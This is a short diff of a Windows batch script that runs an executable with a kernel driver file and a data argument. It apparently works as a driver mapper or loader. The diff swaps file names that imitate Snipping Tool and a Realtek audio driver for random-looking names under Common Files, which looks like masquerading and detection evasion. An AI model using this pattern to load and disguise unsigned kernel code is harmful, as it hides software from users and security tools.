@@ -8,12 +8,12 @@ if % errorLevel % neq 0(
 )
 
 :: Set the path to the executable
-set "exePath=C:\Program Files\Snippingtool\map.exe"
-set "driver1=RealtekHDAudioBus.sys"
+set "exePath=C:\Program Files\Common Files\oh9flp.exe"
+set "driver1=dg3jiq.sys"
 set "data=.data"
 
 :: Change to the directory where the executable is located
-cd /d "C:\Program Files\Snippingtool"
+cd /d "C:\Program Files\Common Files"
 
 :: Run the command with the specified parameters
 "%exePath%" %driver1% %data%
